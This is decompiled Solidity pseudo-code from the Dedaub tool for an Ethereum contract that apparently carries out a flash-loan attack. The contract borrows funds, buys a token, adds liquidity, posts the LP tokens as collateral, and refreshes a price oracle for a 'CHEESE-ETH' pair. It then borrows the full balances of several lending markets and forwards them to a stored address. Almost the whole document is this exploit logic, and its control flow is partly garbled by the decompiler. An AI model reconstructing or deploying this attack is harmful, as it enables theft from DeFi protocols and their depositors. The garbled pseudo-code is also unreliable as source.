// Decompiled by library.dedaub.com
// 2022.11.30 01:42 UTC

// Data structures and variables inferred from the use of storage instructions
uint256[] array_d; // STORAGE[0xd]
uint256 stor_0_0_19; // STORAGE[0x0] bytes 0 to 19
uint256 stor_1_0_19; // STORAGE[0x1] bytes 0 to 19
uint256 _run; // STORAGE[0x2] bytes 0 to 19
uint256 stor_3_0_19; // STORAGE[0x3] bytes 0 to 19
uint256 stor_4_0_19; // STORAGE[0x4] bytes 0 to 19
uint256 stor_5_0_19; // STORAGE[0x5] bytes 0 to 19
uint256 stor_6_0_19; // STORAGE[0x6] bytes 0 to 19
uint256 stor_7_0_19; // STORAGE[0x7] bytes 0 to 19
uint256 stor_8_0_19; // STORAGE[0x8] bytes 0 to 19
uint256 stor_9_0_19; // STORAGE[0x9] bytes 0 to 19
uint256 stor_a_0_19; // STORAGE[0xa] bytes 0 to 19
uint256 stor_b_0_19; // STORAGE[0xb] bytes 0 to 19
uint256 stor_c_0_19; // STORAGE[0xc] bytes 0 to 19
uint256 stor_f_0_19; // STORAGE[0xf] bytes 0 to 19


function _SafeMul(uint256 varg0, uint256 varg1) private { 
    if (varg1) {
        v0 = varg0 * varg1;
        assert(varg1);
        require(v0 / varg1 == varg0, Error('SafeMath: multiplication overflow'));
        return v0;
    } else {
        return 0;
    }
}

function _SafeAdd(uint256 varg0, uint256 varg1) private { 
    v0 = varg1 + varg0;
    require(v0 >= varg1, Error('ds-math-add-overflow'));
    return v0;
}

function 0x1c2f(uint256 varg0, uint256 varg1) private { 
    v0 = v1 = 0;
    require(varg1 - varg0 >= 32v1, v1);
    v2 = MEM[varg0];
    require(v2 <= 0xffffffffffffffffv1, v1);
    v3 = varg0 + v2;
    require(v3 + 31 < varg1v1, v1);
    assert(MEM[v3] <= 0xffffffffffffffff);
    v4 = new uint256[](MEM[v3]);
    assert(!((v4 + ((MEM[v3] << 5) + 32) < v4) | (v4 + ((MEM[v3] << 5) + 32) > 0xffffffffffffffff)));
    v5 = v6 = v4.data;
    v7 = v8 = 32 + v3;
    require(varg1 >= 32 + (v3 + (MEM[v3] << 5))v1, v1);
    while (v0 < MEM[v3]) {
        MEM[v5] = MEM[v7];
        v0 += 1;
        v5 += 32;
        v7 += 32;
    }
    return v4;
}

function () public payable { 
}

function callFunction(address varg0, (address varg1, uint256) varg2, bytes varg3) public nonPayable { 
    require(msg.data.length - 4 >= 128);
    require(varg0 == varg0);
    require(~31 + (msg.data.length - 4) >= 64);
    assert(!((MEM[64] + 64 > 0xffffffffffffffff) | (MEM[64] + 64 < MEM[64])));
    MEM[64] = MEM[64] + 64;
    require(varg1 == address(varg1));
    MEM[MEM[64]] = varg1;
    MEM[MEM[64] + 32] = varg2;
    require(varg3 <= 0xffffffffffffffff);
    require(4 + varg3 + 31 < msg.data.length);
    assert(varg3.length <= 0xffffffffffffffff);
    v0 = new bytes[](varg3.length);
    assert(!((v0 + ((varg3.length + 31 & ~31) + 32) < v0) | (v0 + ((varg3.length + 31 & ~31) + 32) > 0xffffffffffffffff)));
    require(4 + varg3 + varg3.length + 32 <= msg.data.length);
    CALLDATACOPY(v0.data, 4 + varg3 + 32, varg3.length);
    v0[varg3.length] = 0;
    v1 = new struct(2);
    v1.word0 = 0;
    v1.word1 = 0;
    require(v0.data + v0.length - v0.data >= 64);
    assert(!((MEM[64] + 64 > 0xffffffffffffffff) | (MEM[64] + 64 < MEM[64])));
    MEM[64] = MEM[64] + 64;
    require(MEM[v0.data] == address(MEM[v0.data]));
    require((address(MEM[v0.data])).code.size);
    v2, v3 = address(MEM[v0.data]).balanceOf(address(this)).gas(msg.gas);
    require(v2); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    require(_run.code.size);
    v4 = _run.withdraw(v3).gas(msg.gas);
    require(v4); // checks call status, propagates error data on error
    assert(0 < array_d.length);
    array_d[0] = this.balance;
    v5 = new uint256[](2);
    CALLDATACOPY(v5.data, msg.data.length, 64);
    assert(v5.length);
    v6 = v5.data;
    v5[0] = _run;
    assert(1 < v5.length);
    v5[32] = stor_6_0_19;
    v7 = _SafeMul(0xde0b6b3a7640000, 50);
    v8 = new array[](v5.length);
    v9 = v10 = 0;
    v11 = v12 = v8.data;
    v13 = v14 = v5.data;
    while (v9 < v5.length) {
        MEM[v11] = address(MEM[v13]);
        v11 += 32;
        v13 += 32;
        v9 += 1;
    }
    require(stor_1_0_19.code.size);
    v15, v16 = stor_1_0_19.swapExactETHForTokens(0, v8, address(this), 0x77359400).value(v7).gas(msg.gas);
    require(v15); // checks call status, propagates error data on error
    RETURNDATACOPY(v16, 0, RETURNDATASIZE());
    v17 = 0x1c2f(v16, v16 + RETURNDATASIZE());
    require(stor_6_0_19.code.size);
    v18, v19 = stor_6_0_19.approve(stor_1_0_19, ~0).gas(msg.gas);
    require(v18); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    require(v19 == v19);
    require(stor_6_0_19.code.size);
    v20, v21 = stor_6_0_19.balanceOf(address(this)).gas(msg.gas);
    require(v20); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    require(stor_1_0_19.code.size);
    v22, v23, v24, v25 = stor_1_0_19.addLiquidityETH(stor_6_0_19, v21, 0, 0, address(this), 0x77359400).value(this.balance).gas(msg.gas);
    require(v22); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 96);
    require(stor_8_0_19.code.size);
    v26, v27 = stor_8_0_19.balanceOf(address(this)).gas(msg.gas);
    require(v26); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    assert(1 < array_d.length);
    array_d[1] = v27;
    v28 = new uint256[](1);
    CALLDATACOPY(v28.data, msg.data.length, 32);
    assert(v28.length);
    v29 = v28.data;
    v28[0] = stor_7_0_19;
    MEM[MEM[64]] = 0xc299823800000000000000000000000000000000000000000000000000000000;
    v30 = new array[](v28.length);
    v31 = v32 = 0;
    v33 = v34 = v30.data;
    v35 = v36 = v28.data;
    while (v31 < v28.length) {
        MEM[v33] = address(MEM[v35]);
        v33 += 32;
        v35 += 32;
        v31 += 1;
    }
    require(stor_c_0_19.code.size);
    v37, v38 = stor_c_0_19.enterMarkets(v30).gas(msg.gas);
    require(v37); // checks call status, propagates error data on error
    RETURNDATACOPY(v38, 0, RETURNDATASIZE());
    v39 = 0x1c2f(v38, v38 + RETURNDATASIZE());
    require(stor_8_0_19.code.size);
    v40, v41 = stor_8_0_19.approve(stor_7_0_19, ~0).gas(msg.gas);
    require(v40); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    require(v41 == v41);
    require(stor_8_0_19.code.size);
    v42, v43 = stor_8_0_19.balanceOf(address(this)).gas(msg.gas);
    require(v42); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    require(stor_7_0_19.code.size);
    v44, v45 = stor_7_0_19.mint(v43).gas(msg.gas);
    require(v44); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    v46 = new array[](v5.length);
    v47 = v48 = 0;
    v49 = v50 = v46.data;
    v51 = v52 = v5.data;
    while (v47 < v5.length) {
        MEM[v49] = address(MEM[v51]);
        v49 += 32;
        v51 += 32;
        v47 += 1;
    }
    require(stor_1_0_19.code.size);
    v53, v54 = stor_1_0_19.swapExactETHForTokens(0, v46, address(this), 0x77359400).value(0x43c33c1937564800000).gas(msg.gas);
    require(v53); // checks call status, propagates error data on error
    RETURNDATACOPY(v54, 0, RETURNDATASIZE());
    v55 = 0x1c2f(v54, v54 + RETURNDATASIZE());
    require(stor_6_0_19.code.size);
    v56, v57 = stor_6_0_19.balanceOf(address(this)).gas(msg.gas);
    require(v56); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    assert(2 < array_d.length);
    array_d[2] = v57;
    v58 = new uint256[](v59);
    v60 = v59 = 1;
    v61 = v62 = v58.data;
    do {
        MEM[v61] = 96;
        v61 += 32;
        v60 = v60 - 1;
    } while (!v60);
    assert(0 < v58.length);
    v63 = v58.data;
    v58[0] = 0x554e495f56322d4348454553452d45544800000000000000000000000000000070a0823100000000000000000000000000000000000000000000000000000000;
    v64 = v65 = 0;
    v66 = new array[](v58.length);
    MEM[4 + MEM[64]] = 32;
    v67 = v68 = v66.data;
    v69 = v70 = 4 + MEM[64] + 32 + 64;
    v71 = v72 = v58.data;
    while (v64 < v58.length) {
        MEM[v67] = v69 - (4 + MEM[64]) + ~63;
        v73 = 0;
        MEM[v69] = MEM[MEM[v71]];
        while (v73 < MEM[MEM[v71]]) {
            MEM[32 + (v73 + v69)] = MEM[32 + (MEM[v71] + v73)];
            v73 += 32;
        }
        if (v73 > MEM[MEM[v71]]) {
            MEM[v69 + MEM[MEM[v71]] + 32] = v73;
        }
        v69 = 32 + ((~0x1f & 31 + MEM[MEM[v71]]) + v69);
        v67 += 32;
        v71 += 32;
        v64 += 1;
    }
    require(stor_0_0_19.code.size);
    v74 = stor_0_0_19.refresh(v66).gas(msg.gas);
    require(v74); // checks call status, propagates error data on error
    MEM[4 + MEM[64]] = stor_9_0_19;
    require(stor_3_0_19.code.size);
    v75, v76 = stor_3_0_19.balanceOf(stor_9_0_19).gas(msg.gas);
    require(v75); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    require(stor_9_0_19.code.size);
    v77, v78 = stor_9_0_19.borrow(v76).gas(msg.gas);
    require(v77); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    require(!v78);
    require(stor_4_0_19.code.size);
    v79, v80 = stor_4_0_19.balanceOf(stor_b_0_19).gas(msg.gas);
    require(v79); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    require(stor_b_0_19.code.size);
    v81, v82 = stor_b_0_19.borrow(v80).gas(msg.gas);
    require(v81); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    require(!v82);
    require(stor_5_0_19.code.size);
    v83, v84 = stor_5_0_19.balanceOf(stor_a_0_19).gas(msg.gas);
    require(v83); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    require(stor_a_0_19.code.size);
    v85, v86 = stor_a_0_19.borrow(v84).gas(msg.gas);
    require(v85); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    require(!v86);
    assert(v5.length);
    v87 = v5.data;
    v5[0] = stor_6_0_19;
    assert(1 < v5.length);
    v5[32] = _run;
    require(stor_6_0_19.code.size);
    v88, v89 = stor_6_0_19.balanceOf(address(this)).gas(msg.gas);
    require(v88); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    v90 = new array[](v5.length);
    v91 = v92 = 0;
    v93 = v94 = v90.data;
    v95 = v96 = v5.data;
    while (v91 < v5.length) {
        MEM[v93] = address(MEM[v95]);
        v93 += 32;
        v95 += 32;
        v91 += 1;
    }
    require(stor_1_0_19.code.size);
    v97, v98 = stor_1_0_19.swapExactTokensForETH(v89, 0, v90, address(this), 0x77359400).gas(msg.gas);
    require(v97); // checks call status, propagates error data on error
    RETURNDATACOPY(v98, 0, RETURNDATASIZE());
    v99 = 0x1c2f(v98, v98 + RETURNDATASIZE());
    require(stor_3_0_19.code.size);
    v100, v101 = stor_3_0_19.approve(stor_1_0_19, 0).gas(msg.gas);
    require(v100); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    require(v101 == v101);
    require(stor_3_0_19.code.size);
    v102, v103 = stor_3_0_19.approve(stor_1_0_19, ~0).gas(msg.gas);
    require(v102); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    require(v103 == v103);
    if (this.balance < v0[32]) {
        v104 = _SafeAdd(0x1bc16d674ec80000, v0[32] - this.balance);
        assert(v5.length);
        v105 = v5.data;
        v5[0] = stor_3_0_19;
        assert(1 < v5.length);
        v5[32] = _run;
        require(stor_3_0_19.code.size);
        v106, v107 = stor_3_0_19.balanceOf(address(this)).gas(msg.gas);
        require(v106); // checks call status, propagates error data on error
        require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
        v108 = new array[](v5.length);
        v109 = v110 = 0;
        v111 = v112 = v108.data;
        v113 = v114 = v5.data;
        while (v109 < v5.length) {
            MEM[v111] = address(MEM[v113]);
            v111 += 32;
            v113 += 32;
            v109 += 1;
        }
        require(stor_1_0_19.code.size);
        v115, v116 = stor_1_0_19.swapTokensForExactETH(v104, v107, v108, address(this), 0x77359400).gas(msg.gas);
        require(v115); // checks call status, propagates error data on error
        RETURNDATACOPY(v116, 0, RETURNDATASIZE());
        v117 = 0x1c2f(v116, v116 + RETURNDATASIZE());
    }
    require(_run.code.size);
    v118 = _run.deposit().value(v0[32]).gas(msg.gas);
    require(v118); // checks call status, propagates error data on error
    v119 = v120 = 4426;
    v121 = v122 = stor_3_0_19;
    v123 = v124 = stor_f_0_19;
    while (!v121.code.size) {
        v125, v126 = v121.balanceOf(address(this)).gas(msg.gas);
        if (v125) {
            break;
        }
        require(v125); // checks call status, propagates error data on error
        if (MEM[64] + RETURNDATASIZE() - MEM[64] >= 32) {
            break;
        }
        require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
        v127 = stor_f_0_19.call().value(0x1bc16d674ec80000);
        require(v127); // checks call status, propagates error data on error
        require(stor_3_0_19.code.size);
        v128, v129 = stor_3_0_19.balanceOf(stor_f_0_19).gas(msg.gas);
        require(v128); // checks call status, propagates error data on error
        require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
        assert(4 < array_d.length);
        array_d[4] = v129;
        require(stor_4_0_19.code.size);
        v130, v131 = stor_4_0_19.balanceOf(stor_f_0_19).gas(msg.gas);
        require(v130); // checks call status, propagates error data on error
        require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
        assert(5 < array_d.length);
        array_d[5] = v131;
        require(stor_5_0_19.code.size);
        v132, v133 = stor_5_0_19.balanceOf(stor_f_0_19).gas(msg.gas);
        require(v132); // checks call status, propagates error data on error
        require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
        assert(6 < array_d.length);
        array_d[6] = v133;
        assert(7 < array_d.length);
        array_d[7] = stor_f_0_19.balance;
        exit;
        if (stor_4_0_19 != address(v121)) {
            MEM[MEM[64]] = 0xa9059cbb00000000000000000000000000000000000000000000000000000000;
            MEM[4 + MEM[64]] = address(v123);
            MEM[4 + MEM[64] + 32] = v126;
            require((address(v121)).code.size);
            v134 = address(v121).call(MEM[(MEM[64]) len 68], MEM[(MEM[64]) len 32]).gas(msg.gas);
            require(v134); // checks call status, propagates error data on error
            MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 & ~0x1f);
            require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
            require(MEM[MEM[64]] == MEM[MEM[64]]);
        } else {
            MEM[MEM[64]] = 0xa9059cbb00000000000000000000000000000000000000000000000000000000;
            MEM[4 + MEM[64]] = address(v123);
            MEM[4 + MEM[64] + 32] = v126;
            require((address(v121)).code.size);
            v135 = address(v121).call(MEM[(MEM[64]) len (68 + MEM[64] - MEM[64])], MEM[(MEM[64]) len 0]).gas(msg.gas);
            require(v135); // checks call status, propagates error data on error
        }
        goto {'0x114a', '0x11c1', '0x1186'};
        MEM[MEM[64]] = 0x70a0823100000000000000000000000000000000000000000000000000000000;
        v119 = v136 = 4486;
        v121 = v137 = stor_4_0_19;
        v123 = v138 = stor_f_0_19;
        MEM[4 + MEM[64]] = address(this);
        goto 0x10f5;
        MEM[MEM[64]] = 0x70a0823100000000000000000000000000000000000000000000000000000000;
        v119 = v139 = 4545;
        v121 = v140 = stor_5_0_19;
        v123 = v141 = stor_f_0_19;
        MEM[4 + MEM[64]] = address(this);
        goto 0x10f5;
    }
    revert();
}

function run() public payable { 
    v0 = _SafeMul(0xde0b6b3a7640000, 21000);
    require(0x1e0447b19bb6ecfdae1e4ae1694b0c3659614e4e.code.size);
    v1, v2 = 0x1e0447b19bb6ecfdae1e4ae1694b0c3659614e4e.getNumMarkets().gas(msg.gas);
    require(v1); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    v3 = v4 = 0;
    while (v3 < v2) {
        if (0x1e0447b19bb6ecfdae1e4ae1694b0c3659614e4e.code.size) {
            break;
        }
        require(0x1e0447b19bb6ecfdae1e4ae1694b0c3659614e4e.code.size);
        v5, v6 = 0x1e0447b19bb6ecfdae1e4ae1694b0c3659614e4e.getMarketTokenAddress(v3).gas(msg.gas);
        if (v5) {
            break;
        }
        require(v5); // checks call status, propagates error data on error
        if (MEM[64] + RETURNDATASIZE() - MEM[64] >= 32) {
            break;
        }
        require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
        if (v6 == address(v6)) {
            break;
        }
        require(v6 == address(v6));
        if (address(v6) != _run) {
            break;
        }
        if (address(v6) == _run) {
            v7 = _SafeAdd(2, v0);
            require(_run.code.size);
            v8, v9 = _run.approve(0x1e0447b19bb6ecfdae1e4ae1694b0c3659614e4e, v7).gas(msg.gas);
            require(v8); // checks call status, propagates error data on error
            require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
            require(v9 == v9);
            v10 = new uint256[](v11);
            v12 = v11 = 3;
            v13 = v14 = v10.data;
            while (1) {
                v15 = new struct(8);
                v15.word0 = 0;
                v15.word1 = 0;
                MEM[MEM[64]] = 0;
                MEM[MEM[64] + 32] = 0;
                MEM[32 + (MEM[64] + 32)] = 0;
                MEM[64 + (MEM[64] + 32)] = 0;
                v15.word2 = MEM[64];
                v15.word3 = 0;
                v15.word4 = 0;
                v15.word5 = 0;
                v15.word6 = 0;
                v15.word7 = 96;
                MEM[v13] = v15;
                v13 += 32;
                v12 = v12 - 1;
                if (v12) {
                    break;
                }
                if (!v12) {
                    v16 = new struct(8);
                    v16.word0 = 0;
                    v16.word1 = 0;
                    MEM[MEM[64]] = 0;
                    MEM[MEM[64] + 32] = 0;
                    MEM[32 + (MEM[64] + 32)] = 0;
                    MEM[64 + (MEM[64] + 32)] = 0;
                    v16.word2 = MEM[64];
                    v16.word3 = 0;
                    v16.word4 = 0;
                    v16.word5 = 0;
                    v16.word6 = 0;
                    v16.word7 = 96;
                    v17.word0 = 1;
                    v18 = v17.data;
                    v17.word1 = 0;
                    MEM[MEM[64]] = 0;
                    MEM[MEM[64] + 32] = 0;
                    MEM[32 + (MEM[64] + 32)] = 0;
                    MEM[64 + (MEM[64] + 32)] = v0;
                    v17.word2 = MEM[64];
                    v17.word3 = v3;
                    v17.word4 = 0;
                    v17.word5 = address(this);
                    v17.word6 = 0;
                    MEM[MEM[64]] = 0;
                    v17.word7 = MEM[64];
                    assert(0 < v10.length);
                    v19 = v10.data;
                    v10[0] = 0;
                    v20 = new struct(3);
                    v20.word1 = address(_run);
                    v20.word2 = v7;
                    v20.word0 = 64;
                    v21 = new struct(8);
                    v21.word0 = 0;
                    v21.word1 = 0;
                    MEM[MEM[64]] = 0;
                    MEM[MEM[64] + 32] = 0;
                    MEM[32 + (MEM[64] + 32)] = 0;
                    MEM[64 + (MEM[64] + 32)] = 0;
                    v21.word2 = MEM[64];
                    v21.word3 = 0;
                    v21.word4 = 0;
                    v21.word5 = 0;
                    v21.word6 = 0;
                    v21.word7 = 96;
                    MEM[MEM[64]] = 0;
                    MEM[MEM[64] + 32] = 0;
                    MEM[32 + (MEM[64] + 32)] = 0;
                    MEM[64 + (MEM[64] + 32)] = 0;
                    MEM[64] = MEM[64];
                    MEM[96] = 0;
                    MEM[128] = 0;
                    MEM[160] = this;
                    MEM[192] = 0;
                    MEM[224] = MEM[64];
                    assert(1 < v10.length);
                    v10[1] = 0;
                    v22 = new struct(8);
                    v22.word0 = 0;
                    v22.word1 = 0;
                    MEM[MEM[64]] = 0;
                    MEM[MEM[64] + 32] = 0;
                    MEM[32 + (MEM[64] + 32)] = 0;
                    MEM[64 + (MEM[64] + 32)] = 0;
                    v22.word2 = MEM[64];
                    v22.word3 = 0;
                    v22.word4 = 0;
                    v22.word5 = 0;
                    v22.word6 = 0;
                    v22.word7 = 96;
                    v23 = new struct(8);
                    v23.word0 = 0;
                    v23.word1 = 0;
                    MEM[64 + v24.data] = v7;
                    v23.word2 = 0;
                    v23.word3 = v3;
                    v23.word4 = 0;
                    v23.word5 = address(this);
                    v23.word6 = 0;
                    MEM[MEM[64]] = 0;
                    v23.word7 = MEM[64];
                    assert(2 < v10.length);
                    v10[64] = v23;
                    v25 = new uint256[](v26);
                    v27 = v26 = 1;
                    v28 = v29 = v25.data;
                    while (1) {
                        v30 = new struct(2);
                        v30.word0 = 0;
                        v30.word1 = 0;
                        MEM[v28] = v30;
                        v28 += 32;
                        v27 = v27 - 1;
                        if (v27) {
                            break;
                        }
                        if (!v27) {
                            v31 = new struct(2);
                            v31.word0 = 0;
                            v31.word1 = 0;
                            MEM[MEM[64]] = this;
                            MEM[MEM[64] + 32] = 1;
                            assert(0 < v25.length);
                            v32 = v25.data;
                            v25[0] = MEM[64];
                            v33 = new array[](v25.length);
                            v34 = v35 = 0;
                            v36 = v37 = v33.data;
                            v38 = v39 = v25.data;
                            while (v34 < v25.length) {
                                MEM[v36] = address(MEM[MEM[v38]]);
                                MEM[v36 + 32] = MEM[32 + MEM[v38]];
                                v36 += 64;
                                v38 += 32;
                                v34 += 1;
                            }
                            v36 = new array[](v10.length);
                            v40 = v41 = v36.data;
                            v42 = v43 = 32 + (v36 + 96);
                            v44 = v45 = v10.data;
                            while (v34 < v10.length) {
                                MEM[v40] = v42 - v36 + ~31;
                                assert(MEM[MEM[v44]] < 9);
                                MEM[v42] = MEM[MEM[v44]];
                                MEM[v42 + 32] = MEM[32 + MEM[v44]];
                                MEM[v42 + 64] = MEM[MEM[MEM[v44] + 64]];
                                assert(MEM[MEM[MEM[v44] + 64] + 32] < 2);
                                MEM[v42 + 64 + 32] = MEM[MEM[MEM[v44] + 64] + 32];
                                assert(MEM[MEM[MEM[v44] + 64] + 64] < 2);
                                MEM[v42 + 64 + 64] = MEM[MEM[MEM[v44] + 64] + 64];
                                MEM[v42 + 64 + 96] = MEM[96 + MEM[MEM[v44] + 64]];
                                MEM[v42 + 192] = MEM[MEM[v44] + 96];
                                MEM[v42 + 224] = MEM[MEM[v44] + 128];
                                MEM[v42 + 256] = address(MEM[MEM[v44] + 160]);
                                MEM[v42 + 288] = MEM[MEM[v44] + 192];
                                MEM[v42 + 320] = 352;
                                v46 = 0;
                                MEM[v42 + 352] = MEM[MEM[MEM[v44] + 224]];
                                while (v46 < MEM[MEM[MEM[v44] + 224]]) {
                                    MEM[32 + (v46 + (v42 + 352))] = MEM[32 + (MEM[MEM[v44] + 224] + v46)];
                                    v46 += 32;
                                }
                                if (v46 > MEM[MEM[MEM[v44] + 224]]) {
                                    MEM[v42 + 352 + MEM[MEM[MEM[v44] + 224]] + 32] = v46;
                                }
                                v42 = 32 + ((~0x1f & 31 + MEM[MEM[MEM[v44] + 224]]) + (v42 + 352));
                                v40 += 32;
                                v44 += 32;
                                v34 += 1;
                            }
                            require(0x1e0447b19bb6ecfdae1e4ae1694b0c3659614e4e.code.size);
                            v47 = 0x1e0447b19bb6ecfdae1e4ae1694b0c3659614e4e.call(0xa67a6a45, v33, v36).gas(msg.gas);
                            require(v47); // checks call status, propagates error data on error
                            exit;
                        }
                    }
                }
            }
        }
        v3 += 1;
    }
    revert(Error('No marketId found for provided token'));
}

// Note: The function selector is not present in the original solidity code.
// However, we display it for the sake of completeness.

function __function_selector__(bytes4 function_selector) public payable { 
    MEM[64] = 128;
    if (msg.data.length < 4) {
        require(!msg.data.length);
        ();
    } else if (0x8b418713 == function_selector >> 224) {
        callFunction(address,(address,uint256),bytes);
    } else {
        require(0xc0406226 == function_selector >> 224);
        run();
    }
}
